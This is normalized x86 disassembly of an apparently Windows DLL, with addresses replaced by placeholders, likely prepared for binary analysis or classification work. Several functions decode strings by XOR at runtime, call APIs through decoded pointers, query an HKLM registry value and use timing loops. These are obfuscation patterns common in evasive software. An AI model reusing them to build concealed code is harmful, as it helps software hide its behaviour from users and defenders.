jmp r-xdata
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx esi
call sub_10041880
test ebx ebx
je r-xdata
cmp edx 0x8
jb r-xdata
mov ebx [ esi + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
cmp ecx eax
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp ecx 0x8
jb r-xdata
mov ecx esi
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_1004c030
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi ]
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_1004c030
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
push edx
add edi edi
push ecx
add eax edi
push eax
call sub_1002c6d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
mov [ eax + ebx * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + ebx * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
sub_1005c3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089f5d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0xb0 ]
lea esi [ ebx + 0xa0 ]
mov [ ebp - 0x120 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x110 ] ebx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x124 ] edx
mov [ ebp - 0x128 ] esi
mov eax edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
sete al
test al al
je r-xdata
xor eax eax
cmp edi ecx
setne al
cmp eax ecx
push 0x0
push r--data
push eax
call sub_1002b290
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
cmp [ ebx ] cl
jne r-xdata
mov eax 0x44
jmp r-xdata
mov edi ebx
mov [ ebp - 0xfc ] ecx
mov [ ebp - 0xf8 ] ecx
call sub_10011dc0
mov edi eax
mov [ ebp - 0x104 ] edi
test edi edi
je r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x120 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0xf8 ]
lea ecx [ ebp - 0xfc ]
call sub_10034740
test eax eax
jne r-xdata
mov edx edi
call sub_1006a570
mov ecx [ ebp - 0x11c ]
mov edx [ ebp - 0x124 ]
push ecx
mov ecx [ ebp - 0x108 ]
push edx
mov edx [ ebp - 0xf8 ]
push ecx
push eax
mov eax [ ebp - 0xfc ]
push edx
push eax
call sub_10016ff0
push esi
lea ecx [ ebp - 0xa0 ]
mov ebx eax
call sub_10007470
push ebx
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x0
call sub_1001b650
mov ecx esi
push ecx
lea edx [ ebp - 0xa0 ]
push edx
lea eax [ ebp - 0xbc ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000c260
add esp 0xc
lea edx [ ebp - 0x68 ]
mov eax 0x4b
mov [ ebp - 0x4 ] 0x2
call sub_10072600
mov eax [ ebx + 0x4 ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x3
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xd0
mov [ ebp - 0x4 ] 0x4
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x2
call sub_10019100
mov edx [ ebx + 0x38 ]
sub edx [ ebx + 0x34 ]
xor eax eax
sar edx 0x5
mov [ ebp - 0x10c ] eax
test edx edx
je r-xdata
cmp [ ebp - 0x108 ] 0x0
jne r-xdata
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0xfc ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x84 ]
mov edx edi
call sub_1000f3d0
cmp eax 0x42
je r-xdata
mov ecx [ ebp - 0x110 ]
fnstcw [ ebp - 0xfe ]
movzx eax [ ebp - 0xfe ]
fmul [ ecx + 0xf8 ]
or eax 0xc00
mov [ ebp - 0x114 ] eax
fldcw [ ebp - 0x114 ]
fistp [ ebp - 0x118 ]
mov edx [ ebp - 0x118 ]
push edx
fldcw [ ebp - 0xfe ]
call [ Sleep@IAT ]
cmp esi 0x42
je r-xdata
fadd [ r--data ]
mov esi ebx
call sub_10059b00
lea ecx [ ebp - 0xbc ]
call sub_1004c8c0
lea ecx [ ebp - 0x84 ]
call sub_1004c8c0
lea ecx [ ebp - 0xa0 ]
call sub_1004c8c0
xor eax eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ edi + 0xd4 ] 0x0
cmp eax 0x43
jne r-xdata
mov edx [ ebp - 0x104 ]
mov [ edx + 0xd4 ] 0x0
jmp r-xdata
cmp esi 0x43
je r-xdata
mov esi ebx
call sub_10059b00
lea ecx [ ebp - 0xbc ]
call sub_1004c8c0
lea ecx [ ebp - 0x84 ]
call sub_1004c8c0
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004c8c0
mov edi [ ebp - 0x110 ]
xor eax eax
mov [ ebp - 0xfc ] eax
mov [ ebp - 0xf8 ] eax
call sub_10011dc0
mov [ ebp - 0x104 ] eax
test eax eax
jne r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x30 ]
mov eax 0x62
call sub_10072600
mov eax [ ebx + 0x4 ]
push eax
lea ecx [ ebp - 0xf4 ]
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x5
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xd0
mov [ ebp - 0x4 ] 0x6
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xf4 ]
call sub_10019100
mov eax [ ebp - 0xfc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x38 ]
sub ecx [ ebx + 0x34 ]
mov eax [ ebp - 0x10c ]
add [ ebp - 0xf8 ] 0x20
inc eax
sar ecx 0x5
mov [ ebp - 0x10c ] eax
cmp eax ecx
jb r-xdata
mov esi [ ebp - 0x128 ]
mov edi [ ebp - 0x104 ]
call [ GetTickCount@IAT ]
mov edx [ ebx + 0x34 ]
add edx [ ebp - 0xf8 ]
mov ecx [ ebp - 0x104 ]
mov edi eax
lea eax [ ebp - 0xbc ]
push eax
call sub_10065e70
mov esi eax
call [ GetTickCount@IAT ]
sub eax edi
mov [ ebp - 0x114 ] eax
fild [ ebp - 0x114 ]
jns r-xdata
mov edi [ ebp - 0x104 ]
sub_1005c820
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_1005c930
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
push esi
mov esi ecx
movsx ecx [ eax ]
xor ecx 0x4e
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_10066ff0
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x70 ]
call sub_1005ddc0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005c9e0
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_100699c1
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_1005ca50
push ebp
mov ebp esp
push 0xffffffff
push sub_10089a7c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x330
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor edi edi
lea ecx [ ebp - 0x2b4 ]
push edi
push ecx
mov [ ebp - 0x33c ] eax
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x2b4 ]
call sub_10036cc0
mov esi eax
cmp esi edi
je r-xdata
push 0x144
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x328 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0xfe
call sub_10045930
lea edx [ ebp - 0x2ec ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x2bc ] esi
jb r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x2bc ] 0x7
mov [ ebp - 0x2c0 ] edi
mov [ ebp - 0x2d0 ] cx
cmp [ ebp - 0x2d8 ] esi
jb r-xdata
mov eax [ ebp - 0x2d0 ]
push eax
call sub_100187af
add esp 0x4
lea edi [ ebp - 0x328 ]
call sub_1005a1d0
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x32c ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x330 ]
mov [ ebp - 0x330 ] edi
mov [ ebp - 0x32c ] edi
call sub_10023120
mov ebx 0x3
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x330 ]
cmp esi edi
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x2ec ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x2b4 ]
push ecx
lea ecx [ ebp - 0x330 ]
mov [ ebp - 0x328 ] edi
call sub_1000b470
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0xa8 ]
lea eax [ edi + 0x17 ]
call sub_10045930
lea eax [ ebp - 0x2ec ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0xa8 ]
lea esi [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x2bc ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x330 ]
call sub_1000aaa0
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xa8
call sub_10045930
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x7
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] bl
call sub_10019100
mov [ ebp - 0x328 ] 0x4
xor edx edx
mov [ ebp - 0x2bc ] 0x7
mov [ ebp - 0x2c0 ] edi
mov [ ebp - 0x2d0 ] dx
cmp [ ebp - 0x2d8 ] esi
jb r-xdata
mov ecx [ ebp - 0x2d0 ]
push ecx
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0x33c ]
push ecx
lea ebx [ ebp - 0x330 ]
call sub_1002dea0
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
lea eax [ edi + 0x76 ]
call sub_10045930
lea eax [ ebp - 0x2d0 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x8
call sub_1005bbc0
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x9
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x328 ] 0x5
jmp r-xdata
mov esi [ ebp - 0x328 ]
lea edx [ ebp - 0x5c ]
mov eax 0x5c
call sub_10045930
lea eax [ ebp - 0x324 ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x12
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x13
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x324 ]
call sub_10019100
mov esi 0xa
jmp r-xdata
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2ec ]
push eax
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ebx [ ebp - 0x330 ]
lea eax [ ebp - 0x334 ]
push eax
lea ecx [ ebp - 0x338 ]
mov [ ebp - 0x334 ] edi
mov [ ebp - 0x338 ] edi
call sub_100195d0
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x14
call sub_10045930
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xa
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xb
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x328 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x330 ]
call sub_10007720
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax esi
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x334 ]
test eax eax
je r-xdata
lea edi [ ebp - 0x338 ]
lea ecx [ ebp - 0x334 ]
call sub_10014c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xef
call sub_10045930
lea ecx [ ebp - 0x2d0 ]
push esi
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xc
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xd
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x328 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x338 ]
mov ecx [ ebp - 0x334 ]
push eax
push ecx
lea eax [ ebp - 0x2b4 ]
call sub_10005c30
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x139
call sub_10045930
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xe
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xf
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_10019100
mov [ ebp - 0x328 ] 0x8
jmp r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x5a
call sub_10045930
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x10
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x11
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x2d0 ]
call sub_10019100
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10006f30
mov eax 0x9
jmp r-xdata
sub_1005d090
push ebp
mov ebp esp
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffda
and edx 0xff
mov [ ebp + eax * 2 - 0xac ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x54 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc3
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x2b8 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xac ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0x2bc ]
push eax
mov eax [ ebp - 0x2b8 ]
lea ecx [ ebp - 0x2b4 ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ ebp - 0x2bc ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call [ RegCloseKey@IAT ]
test esi esi
pop esi
je r-xdata
mov esi 0x2
lea edx [ ebp - 0x50 ]
mov eax 0x21
call sub_10049e00
mov edx [ edi + 0xd54 ]
movzx eax [ edi + 0x11a ]
movzx ecx [ edi + 0x118 ]
neg edx
sbb edx edx
and edx 0x20
add edx 0x20
push edx
mov edx [ edi + 0x10 ]
push eax
mov eax [ edi + 0xc ]
push ecx
mov ecx [ edi + 0x8 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
lea eax [ ebp - 0x50 ]
push eax
mov ecx 0x104
call sub_1002cb70
xor ecx ecx
add esp 0x20
test eax eax
setns cl
pop ebx
lea eax [ ecx - 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
and eax 0x2
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005d210
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1005d268
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1005d554 ]
jmp [ eax * 4 + jump_table_1005d4f8 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10016e7c
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1006c9ca
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10011c84
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1005d590
push ebp
mov ebp esp
push ebx
mov ebx 0x1
test [ rw-data ] bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
or [ rw-data ] ebx
push sub_1008ad30
call sub_100592b3
add esp 0x4
call sub_100560e0
test eax eax
jne r-xdata
